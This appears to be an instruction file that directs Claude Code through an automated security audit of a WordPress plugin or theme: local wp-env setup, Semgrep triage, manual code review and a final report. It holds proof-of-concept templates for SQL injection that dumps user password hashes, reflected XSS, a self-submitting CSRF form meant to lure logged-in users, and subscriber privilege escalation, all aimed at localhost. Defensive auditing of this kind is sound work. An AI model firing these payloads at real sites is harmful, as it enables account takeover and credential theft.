# WordPress Security Audit Guide

This file defines how Claude Code should conduct automated security audits on this WordPress plugin/theme. It is used in conjunction with the `/security-audit` slash command.

---

## Product Environment

Before running the audit, read the following files if they exist to understand environment requirements:
- `readme.txt` or `README.md` — for WordPress and PHP version requirements
- `composer.json` — for PHP version constraints
- `package.json` — for Node/build tooling
- Any existing `.wp-env.json`

Use this information to generate or update `.wp-env.json` accordingly.

---

## Step 1 — Generate `.wp-env.json`

If `.wp-env.json` does not exist, create it. If it does exist, validate it has the correct structure.

The file must:
- Mount the current directory as a plugin or theme (detect by checking for `*plugin*` in the main PHP file header or a `style.css` with `Theme Name:`)
- Set the correct WordPress version (from readme.txt or default to `latest`)
- Set the correct PHP version (from composer.json or default to `8.1`)
- Include a test admin user

Example structure for a plugin:
```json
{
  "core": "WordPress/WordPress#6.5.0",
  "phpVersion": "8.1",
  "plugins": ["."],
  "themes": [],
  "config": {
    "WP_DEBUG": true,
    "WP_DEBUG_LOG": true,
    "SCRIPT_DEBUG": true
  }
}
```

Example structure for a theme:
```json
{
  "core": "WordPress/WordPress#6.5.0",
  "phpVersion": "8.1",
  "plugins": [],
  "themes": ["."],
  "config": {
    "WP_DEBUG": true,
    "WP_DEBUG_LOG": true,
    "SCRIPT_DEBUG": true
  }
}
```

---

## Step 2 — Run Semgrep

Run the helper script to execute Semgrep:

```bash
bash bin/security-audit.sh semgrep
```

This will output `semgrep-results.json`. Read this file fully before proceeding.

---

## Step 3 — Triage Semgrep Findings

For each finding in `semgrep-results.json`:

### Confirm or dismiss:
- Trace the vulnerable variable back to its source. Is it user-controlled input (`$_GET`, `$_POST`, `$_REQUEST`, `$_COOKIE`, REST API params, `get_option()` if user-controlled)?
- Check if proper sanitization/escaping is applied before the sink
- Check if nonce verification exists where needed
- Check if capability checks exist where needed

### Assign severity:
- **Critical** — Unauthenticated exploit, direct data exposure or RCE possible
- **High** — Authenticated exploit with low privilege (subscriber), significant impact
- **Medium** — Authenticated exploit requiring higher privilege (editor+), moderate impact
- **Low** — Requires admin privilege or has limited impact

### Dismiss if:
- The variable is sanitized/escaped correctly before use
- The function is only accessible to admins and the risk is negligible
- It is a false positive due to Semgrep pattern limitations — document why

---

## Step 4 — Deep Code Analysis

Beyond Semgrep findings, manually analyze the following high-risk areas:

### REST API Endpoints
- Find all `register_rest_route()` calls
- Check `permission_callback` — is it `__return_true` or missing?
- Check if parameters are sanitized with `sanitize_*` functions
- **For endpoints that accept settings objects or arrays** (e.g. `visualizer-settings`, `meta`, `config`): trace each individual field through to where it is stored (post meta, options) and where it is later output (admin pages, frontend). Verify that each field is either sanitized on save (`sanitize_text_field()`, `wp_kses()`, `absint()`, etc.) or escaped on every output (`esc_attr()`, `esc_html()`, `wp_kses_post()`). A valid `permission_callback` does not make the stored data safe — a contributor-level user can still inject a stored XSS payload that executes when an admin views the data.

### AJAX Handlers
- Find all `wp_ajax_` and `wp_ajax_nopriv_` hooks
- Check nonce verification with `check_ajax_referer()` or `wp_verify_nonce()`
- Check capability checks with `current_user_can()`

### Database Queries
- Find all `$wpdb->query()`, `$wpdb->get_results()`, `$wpdb->get_var()`, `$wpdb->get_row()`
- Confirm all use `$wpdb->prepare()` when user input is involved

### File Operations
- Find `file_get_contents()`, `file_put_contents()`, `include()`, `require()`, `include_once()`, `require_once()`
- Check if paths are user-controlled

### Output
- Find `echo`, `print`, `_e()`, `esc_*` usage
- Check unescaped output of user-controlled data

### Options & User Meta
- Find `get_option()`, `get_user_meta()`, `update_option()`, `update_user_meta()`
- Check if values stored or retrieved are sanitized

### Shortcodes
- Find `add_shortcode()` — are attributes sanitized before output?

---

## Step 5 — Generate PoCs

For each confirmed real vulnerability, generate a Proof of Concept.

Store all PoCs in `security-pocs/` directory. Create one file per vulnerability named `poc-{severity}-{short-name}.sh` or `.php` as appropriate.

### PoC requirements:
- Must be self-contained and runnable
- Must include comments explaining what it does and what to expect
- Must specify the required user role (unauthenticated / subscriber / editor / admin)
- Use `curl` for HTTP-based exploits
- Use WP-CLI for database/option-based exploits
- Use PHP scripts for complex payloads

### PoC templates by vulnerability type:

**SQL Injection (curl):**
```bash
#!/bin/bash
# Vulnerability: SQL Injection in [function name] at [file:line]
# Severity: [severity]
# Required role: Unauthenticated
# Expected result: Database error or data leakage in response

TARGET="http://localhost:8888"
PAYLOAD="1 UNION SELECT 1,user_login,user_pass,4,5,6,7,8,9,10 FROM wp_users--"

curl -s -G "$TARGET/wp-admin/admin-ajax.php" \
  --data-urlencode "action=your_action" \
  --data-urlencode "id=$PAYLOAD"
```

**XSS (curl):**
```bash
#!/bin/bash
# Vulnerability: Reflected XSS in [function name] at [file:line]
# Severity: [severity]
# Required role: Unauthenticated
# Expected result: <script>alert(1)</script> appears unescaped in response

TARGET="http://localhost:8888"
PAYLOAD='<script>alert(1)</script>'

curl -s -G "$TARGET/?your_param=$PAYLOAD" | grep -o '<script>alert(1)</script>'
```

**CSRF (HTML form):**
```html
<!-- 
  Vulnerability: CSRF in [action] at [file:line]
  Severity: [severity]
  Required role: Victim must be logged in as [role]
  Expected result: Action executes without user consent
  Instructions: Host this file and trick a logged-in user to open it
-->
<form method="POST" action="http://localhost:8888/wp-admin/admin-ajax.php">
  <input type="hidden" name="action" value="your_action">
  <input type="hidden" name="data" value="malicious_value">
  <input type="submit" value="Click me">
</form>
<script>document.forms[0].submit();</script>
```

**Privilege Escalation (curl with auth):**
```bash
#!/bin/bash
# Vulnerability: Privilege escalation in [endpoint] at [file:line]
# Severity: [severity]
# Required role: Subscriber
# Expected result: Subscriber can perform admin-only action

TARGET="http://localhost:8888"

# Get auth cookie as subscriber
COOKIE=$(curl -s -c - -X POST "$TARGET/wp-login.php" \
  -d "log=subscriber&pwd=password&wp-submit=Log+In&redirect_to=%2F&testcookie=1" \
  -b "wordpress_test_cookie=WP+Cookie+check" | grep wordpress_logged_in | awk '{print $7"="$8}')

# Fire privileged action as subscriber
curl -s -X POST "$TARGET/wp-admin/admin-ajax.php" \
  -b "$COOKIE" \
  -d "action=privileged_action&data=malicious"
```

---

## Step 6 — Run PoCs Against wp-env

Run the helper script to start wp-env and execute all PoCs:

```bash
bash security-audit.sh run-pocs
```

The script will:
1. Start wp-env
2. Create test users (admin, editor, subscriber) with known passwords
3. Execute each PoC in `security-pocs/`
4. Log results to `security-poc-results.json`
5. Stop wp-env

Read `security-poc-results.json` and determine which vulnerabilities are confirmed exploitable.

---

## Step 7 — Write SECURITY_REPORT.md

Write a comprehensive security report. Only include **confirmed, exploitable** vulnerabilities.

### Report structure:

```markdown
# Security Audit Report — [Plugin/Theme Name]
**Date:** [date]
**Audited by:** Claude Code Automated Security Pipeline
**Environment:** WordPress [version], PHP [version]

## Summary
- Total confirmed vulnerabilities: X
- Critical: X | High: X | Medium: X | Low: X

## Findings

### [SEVERITY] — [Vulnerability Type] in [File]

**Location:** `path/to/file.php` line X  
**Severity:** Critical / High / Medium / Low  
**Required role:** Unauthenticated / Subscriber / Editor / Admin  

**Description:**  
[Clear explanation of the vulnerability and why it is dangerous]

**Reproduction:**  
[Step by step instructions]

**Payload / PoC:**  
\`\`\`bash
[PoC command or script]
\`\`\`

**Expected Result:**  
[What happens when exploited]

**Recommended Fix:**  
[Specific code-level fix with example]

---
```

---

## Cleanup

After the report is written, run:

```bash
bash security-audit.sh cleanup
```

This removes temporary files but preserves `SECURITY_REPORT.md` and `security-pocs/`.